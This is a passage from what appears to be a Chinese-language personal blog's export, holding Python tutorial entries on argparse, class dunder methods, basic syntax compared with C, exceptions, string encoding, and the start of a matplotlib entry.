class="line"><span class="comment"># argument_default - (default: None)设置一个全局的选项的缺省值，一般每个选项单独设置，所以这个参数用得少，不细说</span></span><br><span class="line"><span class="comment"># usage - (default: generated)如果你需要修改usage的信息（usage: PROG [-h] [--foo [FOO]] bar [bar ...]），那么可以修改这个，一般不要修改。</span></span><br><span class="line"><span class="comment"># conflict_handler - 不建议使用。这个在极端情况下才会用到，主要是定义两个add_argument中添加的选项的名字发生冲突时怎么处理，默认处理是抛出异常。</span></span><br><span class="line"><span class="comment">#注释一行有##表示这几个参数比较常用</span></span><br><span class="line">parser = argparse.ArgumentParser(description=<span class="string">&quot;This is a description of %(prog)s&quot;</span>, epilog=<span class="string">&quot;This is a epilog of %(prog)s&quot;</span>, prefix_chars=<span class="string">&quot;-+&quot;</span>, fromfile_prefix_chars=<span class="string">&quot;@&quot;</span>, formatter_class=argparse.ArgumentDefaultsHelpFormatter)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ArgumentParser.add_argument(name or flags...[, action][, nargs][, const][, default][, type][, choices][, required][, help][, metavar][, dest])</span></span><br><span class="line"><span class="comment"># add_argument的参数是比较复杂的。。。</span></span><br><span class="line"><span class="comment"># name or flags - 指定参数的形式，想写几个写几个，不过我们一般就写两个，一个短参数，一个长参数，看下面的例子&quot;-f&quot;, &quot;--file&quot;</span></span><br><span class="line"><span class="comment"># 可选的选项，位置不固定，想怎么写就怎么写，默认是可选的</span></span><br><span class="line">parser.add_argument(<span class="string">&quot;-f&quot;</span>, <span class="string">&quot;--file&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;test test test&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 位置固定的选项，例如&quot;prog i_am_bar&quot;，这样子的话，i_am_bar就是bar选项的值啦，默认是必须有的</span></span><br><span class="line">parser.add_argument(<span class="string">&quot;bar&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;test test test&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># nargs - 指定这个参数后面的value有多少个，例如，我们希望使用-n 1 2 3 4，来设置n的值为[1, 2, 3, 4]</span></span><br><span class="line">parser.add_argument(<span class="string">&quot;-n&quot;</span>, <span class="string">&quot;--num&quot;</span>, nargs=<span class="string">&quot;+&quot;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里nargs=&quot;+&quot;表示，如果你指定了-n选项，那么-n后面至少要跟一个参数，+表示至少一个,?表示一个或0个,*0个或多个，</span></span><br><span class="line"><span class="comment"># default - 如果命令行没有出现这个选项，那么使用default指定的默认值</span></span><br><span class="line">parser.add_argument(<span class="string">&quot;+g&quot;</span>, <span class="string">&quot;++gold&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;test test test&quot;</span>, default=<span class="string">&quot;test_gold&quot;</span>)<span class="comment">#需要prefix_chars包含&quot;+&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># type - 如果希望传进来的参数是指定的类型（例如 float, int or file等可以从字符串转化过来的类型），可以使用</span></span><br><span class="line">parser.add_argument(<span class="string">&quot;-x&quot;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># choices - 设置参数值的范围，如果choices中的类型不是字符串，记得指定type哦</span></span><br><span class="line">parser.add_argument(<span class="string">&quot;-y&quot;</span>, choices=[<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;d&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># required - 通常-f这样的选项是可选的，但是如果required=True那么就是必须的了</span></span><br><span class="line">parser.add_argument(<span class="string">&quot;-z&quot;</span>, choices=[<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;d&#x27;</span>], required=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># metavar - 参数的名字，在显示 帮助信息时才用到.</span></span><br><span class="line">parser.add_argument(<span class="string">&quot;-o&quot;</span>, metavar=<span class="string">&quot;OOOOOO&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># help - 设置这个选项的帮助信息</span></span><br><span class="line"><span class="comment"># dest - 设置这个选项的值就是解析出来后放到哪个属性中</span></span><br><span class="line">parser.add_argument(<span class="string">&quot;-q&quot;</span>, dest=<span class="string">&quot;world&quot;</span>)</span><br><span class="line"></span><br><span class="line">args = parser.parse_args(args) <span class="comment"># 如果你没有args参数，那么就使用sys.argv，也就是命令行参数啦。有这个参数，就方便我们调试啊</span></span><br><span class="line"><span class="comment"># args.world就是-q的值啦</span></span><br><span class="line"><span class="comment"># action - The basic type of action to be taken when this argument is encountered at the command line.</span></span><br><span class="line"><span class="comment"># const - A constant value required by some action and nargs selections.</span></span><br><span class="line"><span class="comment"># 这两个自己看帮助文档啦，比较复杂</span></span><br><span class="line"><span class="comment"># http://docs.python.org/library/argparse.html</span></span><br><span class="line"><span class="built_in">print</span> args</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>language</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>argparse</tag>
      </tags>
  </entry>
  <entry>
    <title>python class 中各种&quot;__&quot;的隐藏使用</title>
    <url>/2016/12/08/language/python/python-class-underline/</url>
    <content><![CDATA[<h1 id="Class"><a href="#Class" class="headerlink" title="Class"></a>Class</h1><p>Python中也有类的概念，类中的成员函数不支持重载（overloading method），但支持重写（overiding method）。Python Class中还有很多隐含的成员函数，这些函数的首尾都是“__”开头结尾的。</p>
<h1 id="隐藏的用法"><a href="#隐藏的用法" class="headerlink" title="隐藏的用法"></a>隐藏的用法</h1><h2 id="构造与析构"><a href="#构造与析构" class="headerlink" title="构造与析构"></a>构造与析构</h2><h3 id="new"><a href="#new" class="headerlink" title="new"></a>new</h3><p>创建对象时调用，返回当前对象的一个实例。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">__new__(cls, *args, **kwargs)</span><br></pre></td></tr></table></figure>

<h3 id="init"><a href="#init" class="headerlink" title="init"></a>init</h3><p>对象建立后，第一个被调用的函数，相当于c++中的构造函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">__init__(<span class="variable language_">self</span>, *args, **kwargs)</span><br></pre></td></tr></table></figure>

<h3 id="del"><a href="#del" class="headerlink" title="del"></a>del</h3><p>对象销毁前，最后调用的函数，相当于c++中的析构函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">__del__(<span class="variable language_">self</span>, *args, **kwargs)</span><br></pre></td></tr></table></figure>

<h2 id="call"><a href="#call" class="headerlink" title="call"></a>call</h2><p>重写__call__方法后，对象当函数来使用，相当于重载了括号运算符</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">__call__(<span class="variable language_">self</span>, *args, **kwargs)</span><br></pre></td></tr></table></figure>

<h2 id="属性操作"><a href="#属性操作" class="headerlink" title="属性操作"></a>属性操作</h2><h3 id="getattr"><a href="#getattr" class="headerlink" title="getattr"></a>getattr</h3><p>获取属性</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">__getattr__(<span class="variable language_">self</span>, key)</span><br></pre></td></tr></table></figure>

<h3 id="setattr"><a href="#setattr" class="headerlink" title="setattr"></a>setattr</h3><p>创建或设置属性</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">__setattr__(<span class="variable language_">self</span>, key, value)</span><br></pre></td></tr></table></figure>

<h3 id="delattr"><a href="#delattr" class="headerlink" title="delattr"></a>delattr</h3><p>删除属性</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">__delattr__(<span class="variable language_">self</span>, key)</span><br></pre></td></tr></table></figure>

<h2 id="str"><a href="#str" class="headerlink" title="str"></a>str</h2><p>对象转换字符串函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">__str__(<span class="variable language_">self</span>)</span><br></pre></td></tr></table></figure>

<h2 id="repr"><a href="#repr" class="headerlink" title="repr"></a><strong>repr</strong></h2><p>str()出来的是给人看的，repr()出来的是给Python看的，可以通过eval()重新变回一个Python对象。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">__repr__(<span class="variable language_">self</span>)</span><br></pre></td></tr></table></figure>

<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li><a href="http://www.jianshu.com/p/b937f346dd4a">python中__setattr__, <strong>getattr</strong>, <strong>delattr</strong>, <strong>call</strong></a></li>
<li><a href="http://blog.csdn.net/yuzhiyuxia/article/details/41941205">python中的__init__ 、__new__、__call__小结及使用</a></li>
<li><a href="http://www.guokr.com/post/91890/">菜鸟求大大们解释Python里str函数和repr函数的区别</a></li>
</ul>
]]></content>
      <tags>
        <tag>python</tag>
        <tag>class</tag>
      </tags>
  </entry>
  <entry>
    <title>Python基础语法</title>
    <url>/2017/09/19/language/python/python-basic-grammar/</url>
    <content><![CDATA[<h1 id="Python语法概况"><a href="#Python语法概况" class="headerlink" title="Python语法概况"></a>Python语法概况</h1><p><img src="/images/python/grammar.png" alt="grammar"></p>
<h2 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h2><p>and , exec , not , assert , finally , or , break , for , pass , class , from , print , countinue , global , raise , def , if , return , del , import , try , elif , in , while , else , is , with , except , lambda , yield</p>
<ul>
<li>exec<br>  用来执行储存在字符串或文件中的Python语句。eg：  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">exec</span> <span class="string">&#x27;print &quot;Hello World&quot;&#x27;</span></span><br><span class="line">Hello World</span><br></pre></td></tr></table></figure>
  注意例子中exec语句的用法和eval_r(), execfile()是不一样的. exec是一个语句(就象print或while), 而eval_r()和execfile()则是内建函数。</li>
<li>lambda<br>  在python中使用lambda来创建匿名函数，lambda会创建一个函数对象，但不会把这个函数对象赋给一个标识符，而def则会把函数对象赋值给一个变量。lambda它只是一个表达式，而def则是一个语句。eg:  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">m = <span class="keyword">lambda</span> x,y,z: (x-y)*z</span><br><span class="line"><span class="built_in">print</span> m(<span class="number">3</span>,<span class="number">1</span>,<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
  lambda一般只用来定义简单的函数。</li>
<li>yield<br>  它和return差不多的用法，只是最后是返回了一个生成器，当你调用yield所在的那个函数的时候，那个函数并没有运行，只会返回一个生成器的对象，第一次在for中调用生成器的的对象，它将会运行你函数中的代码从最开始一直到到碰到了yield的关键字，然后它会返回循环中的第一个值。然后每一次其他的调用将会运行你在这个函数中所写的循环多一次，并且返回下一个值，知道没有值可以返回了。eg:  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">def</span> <span class="title function_">createGenerator</span>():</span><br><span class="line"><span class="meta">... </span>   mylist = <span class="built_in">range</span>(<span class="number">3</span>)</span><br><span class="line"><span class="meta">... </span>   <span class="keyword">for</span> i <span class="keyword">in</span> mylist:</span><br><span class="line"><span class="meta">... </span>       <span class="keyword">yield</span> i*i</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>mygenerator = createGenerator() <span class="comment"># create a generator</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(mygenerator) <span class="comment"># mygenerator is an object!</span></span><br><span class="line">&lt;generator <span class="built_in">object</span> createGenerator at <span class="number">0xb7555c34</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> mygenerator:</span><br><span class="line"><span class="meta">... </span>    <span class="built_in">print</span>(i)</span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">4</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h1 id="Python-VS-C"><a href="#Python-VS-C" class="headerlink" title="Python VS C"></a>Python VS C</h1><table>
<thead>
<tr>
<th align="center">Pytho</th>
<th align="center">C</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">字母、数字、下划线组成，不能以数字开头，区分大小写</td>
<td align="center">字母、数字、下划线组成，不能以数字开头，区分大小写</td>
<td align="left">标识符</td>
</tr>
<tr>
<td align="center">单下划线开头的代表不能直接访问的类属性，通过类提供的接口访问</td>
<td align="center"></td>
<td align="left"></td>
</tr>
<tr>
<td align="center">双下划线开头的代表类的私有成员</td>
<td align="center"></td>
<td align="left"></td>
</tr>
<tr>
<td align="center">双下划线开头和结尾的代表特殊方法专用的标识(eg:<strong>init</strong>())</td>
<td align="center"></td>
<td align="left"></td>
</tr>
<tr>
<td align="center">“&quot;</td>
<td align="center">不需要，以”;”结尾</td>
<td align="left">行继符</td>
</tr>
<tr>
<td align="center">单引号(‘),双引号(“),三引号(‘’’)</td>
<td align="center">双引号(“)</td>
<td align="left">字符串</td>
</tr>
<tr>
<td align="center">#</td>
<td align="center">&#x2F;&#x2F;</td>
<td align="left">注释</td>
</tr>
<tr>
<td align="center">:</td>
<td align="center">{}</td>
<td align="left">代码块</td>
</tr>
<tr>
<td align="center">if</td>
<td align="center">if</td>
<td align="left">条件</td>
</tr>
<tr>
<td align="center">elif</td>
<td align="center">else if</td>
<td align="left"></td>
</tr>
<tr>
<td align="center">else</td>
<td align="center">else</td>
<td align="left"></td>
</tr>
<tr>
<td align="center">a &#x3D; b &#x3D; 1 or a,b&#x3D;1,”Hi”</td>
<td align="center">int a&#x3D;1 , b&#x3D;2</td>
<td align="left">多变量赋值</td>
</tr>
<tr>
<td align="center">Numbers, String, List, Tuple, Dictionary</td>
<td align="center">char, int , float, double, void, point*</td>
<td align="left">基础数据类型</td>
</tr>
<tr>
<td align="center">list[item1, item2, …  itemN]</td>
<td align="center"></td>
<td align="left">列表，允许更新</td>
</tr>
<tr>
<td align="center">tuple(item1, item2, …, itemN)</td>
<td align="center"></td>
<td align="left">元组，不允许更新操作</td>
</tr>
<tr>
<td align="center">dict{key1:value1, key2:value2, …, keyN:valueN}</td>
<td align="center"></td>
<td align="left">字典，允许更新</td>
</tr>
<tr>
<td align="center">**</td>
<td align="center"></td>
<td align="left">幂，a**b a的b次幂</td>
</tr>
<tr>
<td align="center">&#x2F;&#x2F;</td>
<td align="center">mod</td>
<td align="left">整除</td>
</tr>
<tr>
<td align="center">“!&#x3D;” , “&lt;&gt;”</td>
<td align="center">“!&#x3D;”</td>
<td align="left">不等</td>
</tr>
<tr>
<td align="center">“and”</td>
<td align="center">“&amp;&amp;”</td>
<td align="left">逻辑运算</td>
</tr>
<tr>
<td align="center">“or”</td>
<td align="center">双竖线</td>
<td align="left"></td>
</tr>
<tr>
<td align="center">“not”</td>
<td align="center">“!”</td>
<td align="left"></td>
</tr>
<tr>
<td align="center">“in” , “not in”</td>
<td align="center"></td>
<td align="left">判断元素在不在元组或列表中</td>
</tr>
<tr>
<td align="center">“is” , “not is”</td>
<td align="center"></td>
<td align="left">判断两个标识符是不是引用自一个对象</td>
</tr>
<tr>
<td align="center">“while”, “for”</td>
<td align="center">“while”, “for”, “do..while”</td>
<td align="left">循环, python中可与”else”一起执行条件为false的情况</td>
</tr>
<tr>
<td align="center">“break”, “continue”, “pass”</td>
<td align="center">“break”, “continue”, “goto”</td>
<td align="left">循环控制</td>
</tr>
</tbody></table>
<h1 id="Python编译"><a href="#Python编译" class="headerlink" title="Python编译"></a>Python编译</h1><table>
<thead>
<tr>
<th align="left">选项</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">-d</td>
<td align="left">在解析时显示调试信息</td>
</tr>
<tr>
<td align="left">-O</td>
<td align="left">生成优化代码 ( .pyo 文件 )</td>
</tr>
<tr>
<td align="left">-S</td>
<td align="left">启动时不引入查找Python路径的位置</td>
</tr>
<tr>
<td align="left">-c cmd</td>
<td align="left">执行 Python 脚本，并将运行结果作为 cmd 字符串</td>
</tr>
<tr>
<td align="left">file</td>
<td align="left">在给定的python文件执行python脚本</td>
</tr>
</tbody></table>
<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li><a href="https://www.w3cschool.cn/python/python-basic-syntax.html">Python 基础语法</a></li>
<li><a href="http://www.cnblogs.com/edenpans/p/6524966.html">PYTHON YIELD 关键字</a></li>
</ul>
]]></content>
      <categories>
        <category>language</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>Exception</title>
    <url>/2017/10/02/language/python/python-exception/</url>
    <content><![CDATA[<h1 id="Exception语法"><a href="#Exception语法" class="headerlink" title="Exception语法"></a>Exception语法</h1><h2 id="try-except"><a href="#try-except" class="headerlink" title="try-except"></a>try-except</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    &lt;语句&gt;</span><br><span class="line"><span class="keyword">except</span> &lt;异常名字&gt;:</span><br><span class="line">    &lt;语句&gt;</span><br><span class="line"><span class="keyword">except</span> &lt;异常名字&gt;, &lt;异常数据变量&gt;:</span><br><span class="line">    &lt;语句&gt;</span><br><span class="line"><span class="keyword">except</span> (&lt;异常名字&gt;,&lt;异常名字&gt;,...)[, &lt;异常数据变量&gt;]:</span><br><span class="line">    &lt;语句&gt;</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    &lt;语句&gt;</span><br></pre></td></tr></table></figure>

<h2 id="try-finally"><a href="#try-finally" class="headerlink" title="try-finally"></a>try-finally</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    &lt;语句&gt;</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    <span class="comment"># 无论是否发生异常都将执行最后的代码</span></span><br><span class="line">    <span class="comment"># 退出try时总会执行</span></span><br><span class="line">    &lt;语句&gt;</span><br></pre></td></tr></table></figure>

<h2 id="raise"><a href="#raise" class="headerlink" title="raise"></a>raise</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">raise</span> [Exception [, args [, traceback]]]</span><br></pre></td></tr></table></figure>

<p>Exception是异常的类型（例如，NameError）参数是一个异常参数值。该参数是可选的，如果不提供，异常的参数是”None”。最后一个参数是可选的（在实践中很少使用），如果存在，是跟踪异常对象。</p>
<h1 id="标准异常"><a href="#标准异常" class="headerlink" title="标准异常"></a>标准异常</h1><table>
<thead>
<tr>
<th align="center">异常名称</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">BaseException</td>
<td align="left">所有异常的基类</td>
</tr>
<tr>
<td align="center">SystemExit</td>
<td align="left">解释器请求退出</td>
</tr>
<tr>
<td align="center">KeyboardInterrupt</td>
<td align="left">用户中断执行(通常是输入^C)</td>
</tr>
<tr>
<td align="center">Exception</td>
<td align="left">常规错误的基类</td>
</tr>
<tr>
<td align="center">StopIteration</td>
<td align="left">迭代器没有更多的值</td>
</tr>
<tr>
<td align="center">GeneratorExit</td>
<td align="left">生成器(generator)发生异常来通知退出</td>
</tr>
<tr>
<td align="center">StandardError</td>
<td align="left">所有的内建标准异常的基类</td>
</tr>
<tr>
<td align="center">ArithmeticError</td>
<td align="left">所有数值计算错误的基类</td>
</tr>
<tr>
<td align="center">FloatingPointError</td>
<td align="left">浮点计算错误</td>
</tr>
<tr>
<td align="center">OverflowError</td>
<td align="left">数值运算超出最大限制</td>
</tr>
<tr>
<td align="center">ZeroDivisionError</td>
<td align="left">除(或取模)零 (所有数据类型)</td>
</tr>
<tr>
<td align="center">AssertionError</td>
<td align="left">断言语句失败</td>
</tr>
<tr>
<td align="center">AttributeError</td>
<td align="left">对象没有这个属性</td>
</tr>
<tr>
<td align="center">EOFError</td>
<td align="left">没有内建输入,到达EOF 标记</td>
</tr>
<tr>
<td align="center">EnvironmentError</td>
<td align="left">操作系统错误的基类</td>
</tr>
<tr>
<td align="center">IOError</td>
<td align="left">输入&#x2F;输出操作失败</td>
</tr>
<tr>
<td align="center">OSError</td>
<td align="left">操作系统错误</td>
</tr>
<tr>
<td align="center">WindowsError</td>
<td align="left">系统调用失败</td>
</tr>
<tr>
<td align="center">ImportError</td>
<td align="left">导入模块&#x2F;对象失败</td>
</tr>
<tr>
<td align="center">LookupError</td>
<td align="left">无效数据查询的基类</td>
</tr>
<tr>
<td align="center">IndexError</td>
<td align="left">序列中没有此索引(index)</td>
</tr>
<tr>
<td align="center">KeyError</td>
<td align="left">映射中没有这个键</td>
</tr>
<tr>
<td align="center">MemoryError</td>
<td align="left">内存溢出错误(对于Python 解释器不是致命的)</td>
</tr>
<tr>
<td align="center">NameError</td>
<td align="left">未声明&#x2F;初始化对象 (没有属性)</td>
</tr>
<tr>
<td align="center">UnboundLocalError</td>
<td align="left">访问未初始化的本地变量</td>
</tr>
<tr>
<td align="center">ReferenceError</td>
<td align="left">弱引用(Weak reference)试图访问已经垃圾回收了的对象</td>
</tr>
<tr>
<td align="center">RuntimeError</td>
<td align="left">一般的运行时错误</td>
</tr>
<tr>
<td align="center">NotImplementedError</td>
<td align="left">尚未实现的方法</td>
</tr>
<tr>
<td align="center">SyntaxError</td>
<td align="left">Python 语法错误</td>
</tr>
<tr>
<td align="center">IndentationError</td>
<td align="left">缩进错误</td>
</tr>
<tr>
<td align="center">TabError</td>
<td align="left">Tab 和空格混用</td>
</tr>
<tr>
<td align="center">SystemError</td>
<td align="left">一般的解释器系统错误</td>
</tr>
<tr>
<td align="center">TypeError</td>
<td align="left">对类型无效的操作</td>
</tr>
<tr>
<td align="center">ValueError</td>
<td align="left">传入无效的参数</td>
</tr>
<tr>
<td align="center">UnicodeError</td>
<td align="left">Unicode 相关的错误</td>
</tr>
<tr>
<td align="center">UnicodeDecodeError</td>
<td align="left">Unicode 解码时的错误</td>
</tr>
<tr>
<td align="center">UnicodeEncodeError</td>
<td align="left">Unicode 编码时错误</td>
</tr>
<tr>
<td align="center">UnicodeTranslateError</td>
<td align="left">Unicode 转换时错误</td>
</tr>
<tr>
<td align="center">Warning</td>
<td align="left">警告的基类</td>
</tr>
<tr>
<td align="center">DeprecationWarning</td>
<td align="left">关于被弃用的特征的警告</td>
</tr>
<tr>
<td align="center">FutureWarning</td>
<td align="left">关于构造将来语义会有改变的警告</td>
</tr>
<tr>
<td align="center">OverflowWarning</td>
<td align="left">旧的关于自动提升为长整型(long)的警告</td>
</tr>
<tr>
<td align="center">PendingDeprecationWarning</td>
<td align="left">关于特性将会被废弃的警告</td>
</tr>
<tr>
<td align="center">RuntimeWarning</td>
<td align="left">可疑的运行时行为(runtime behavior)的警告</td>
</tr>
<tr>
<td align="center">SyntaxWarning</td>
<td align="left">可疑的语法的警告</td>
</tr>
<tr>
<td align="center">UserWarning</td>
<td align="left">用户代码生成的警告</td>
</tr>
</tbody></table>
<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li><a href="http://www.runoob.com/python/python-exceptions.html">Python 异常处理</a></li>
</ul>
]]></content>
      <categories>
        <category>language</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>exception</tag>
      </tags>
  </entry>
  <entry>
    <title>encode and decode</title>
    <url>/2017/09/25/language/python/python-encode-decode/</url>
    <content><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>计算机只能处理数字，如果要处理文本，就必须先把文本转换为数字才能处理。最早的计算机在设计时采用8个比特（bit）作为一个字节（byte），所以，一个字节能表示的最大的整数就是255（二进制11111111&#x3D;十进制255），如果要表示更大的整数，就必须用更多的字节。比如两个字节可以表示的最大整数是65535，4个字节可以表示的最大整数是4294967295。</p>
<h2 id="ASCII"><a href="#ASCII" class="headerlink" title="ASCII"></a>ASCII</h2><p>规定了128个字符的编码(准确地说ASCII码是一个编码字符集),比如空格“SPACE”是32（二进制00100000），大写的字母A是65（二进制01000001）。这128个符号（包括32个不能打印出来的控制符号），只占用了一个字节的后面7位，最前面的1位统一规定为0。后128个称为扩展ASCII码，目前许多基于x86的系统都支持使用扩展ASCII码。256个ASCII码中的后128个扩展码可定制用来表示特殊字符和非英语字符，GB2312就是利用这后面的128个扩展字符来表示汉字，[161,254]共94个字符来组成双字节来表示简体汉字字符表。</p>
<h2 id="Unicode"><a href="#Unicode" class="headerlink" title="Unicode"></a>Unicode</h2><p>光是英语字符ASCII编码字符集是够了，但是如果算上世界上其他的语言的字符，ASCII码显然不够了，于是Unicode编码字符集应运而生。Unicode用数字0-0x10FFFF来映射这些字符，最多可以容纳1114112个字符，或者说有1114112个码位。码位就是可以分配给字符的数字。UTF-8、UTF-16、UTF-32都是将所有Unicode用到的数字转换为程序数据的编码方案。全世界的字符加起来也用不了所有的码位，Unicode 5.0版本中，才用了238605个码位。</p>
<h2 id="UTF8"><a href="#UTF8" class="headerlink" title="UTF8"></a>UTF8</h2><p>新问题的出现：如果统一成Unicode编码，乱码问题从此消失了。但是，如果你写的文本基本上全部是英文的话，用Unicode编码比ASCII编码需要多一倍的存储空间，在存储和传输上就十分不划算。因此，又出现了把Unicode编码转化为“可变长编码”的UTF-8编码。UTF-8编码把一个Unicode字符根据不同的数字大小编码成1-6个字节，常用的英文字母被编码成1个字节，汉字通常是3个字节，只有很生僻的字符才会被编码成4-6个字节。如果你要传输的文本包含大量英文字符，用UTF-8编码就能节省空间。ASCII编码实际上可以被看成是UTF-8编码的一部分，所以，大量只支持ASCII编码的历史遗留软件可以在UTF-8编码下继续工作。Unicode是字符集，UTF-8、UTF-16等是编码格式，定义“字符对应的数字”如何在以二进制的方式存储。</p>
<h2 id="GB2312"><a href="#GB2312" class="headerlink" title="GB2312"></a>GB2312</h2><p>规定: 一个小于127的字符的意义与原来相同, 但两个大于127的字符连在一起时, 就表示一个汉字, 前面的一个字节(他称之为高字节)从0xA1用到 0xF7, 后面一个字节(低字节)从0xA1到0xFE, 这样我们就可以组合出大约7000多个简体汉字了. 在这些编码里, 我们还把数学符号,罗马希腊的 字母,日文的假名们都编进去了, 连在 ASCII 里本来就有的数字,标点,字母都统统重新编了两个字节长的编码, 这就是常说的”全角”字符, 而原来在127号以下的那些就叫”半角”字符了。</p>
<h2 id="GBK"><a href="#GBK" class="headerlink" title="GBK"></a>GBK</h2><p>GBK 包括了 GB2312 的所有内容, 同时又增加了近20000个新的汉字(包括繁体字)和符号。</p>
<h1 id="转换"><a href="#转换" class="headerlink" title="转换"></a>转换</h1><p>unicode兼容ascii，GBK兼容GB2312，转换也就是unicode与GBK之间的事情了。字符串在Python内部的表示是unicode编码，因此，在做编码转换时，通常需要以unicode作为中间编码，即先将其他编码的字符串解码（decode）成unicode，再从unicode编码（encode）成另一种编码。</p>
<ul>
<li>decode的作用是将其他编码的字符串转换成unicode编码，如str1.decode(‘gb2312’)，表示将gb2312编码的字符串转换成unicode编码</li>
<li>encode的作用是将unicode编码转换成其他编码的字符串，如str2.encode(‘gb2312’)，表示将unicode编码的字符串转换成gb2312编码</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding=utf8</span></span><br><span class="line"></span><br><span class="line">s = <span class="string">&#x27;中文&#x27;</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">type</span>(s)</span><br><span class="line"><span class="built_in">print</span> s</span><br><span class="line"></span><br><span class="line">us = s.decode(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">type</span>(us)</span><br><span class="line"><span class="built_in">print</span> s</span><br><span class="line"></span><br><span class="line">gs = us.encode(<span class="string">&#x27;gb2312&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">type</span>(gs)</span><br><span class="line"><span class="built_in">print</span> gs</span><br></pre></td></tr></table></figure>

<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li><a href="http://www.cnblogs.com/yuguangchuan/p/4310952.html">三种常见字符编码简介：ASCII、Unicode和UTF-8</a></li>
<li><a href="http://blog.csdn.net/nodeathphoenix/article/details/7057760">Unicode 字符集与它的编码方式</a></li>
<li><a href="http://blog.csdn.net/zhao1949/article/details/51198040">字符编码的故事：ASCII，GB2312，Unicode，UTF-8，UTF-16</a></li>
<li><a href="http://blog.csdn.net/q_l_s/article/details/51253542">Python字符串的编码与解码(encode与decode)</a></li>
</ul>
]]></content>
      <categories>
        <category>language</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>matplotlib</title>
    <url>/2017/11/03/language/python/python-matplotlib/</url>
    <content><![CDATA[<p>Matplotlib数据可视化第三方库(<a href="http://matplotlib.org/">官网</a>)。由各种可视化类构成。</p>
<h1 id="matplotlib-pyplot"><a href="#matplotlib-pyplot" class="headerlink" title="matplotlib.pyplot"></a>matplotlib.pyplot</h1><p><code>matplotlib.pyplot</code>是绘制各类可视化图形的命令子库。</p>
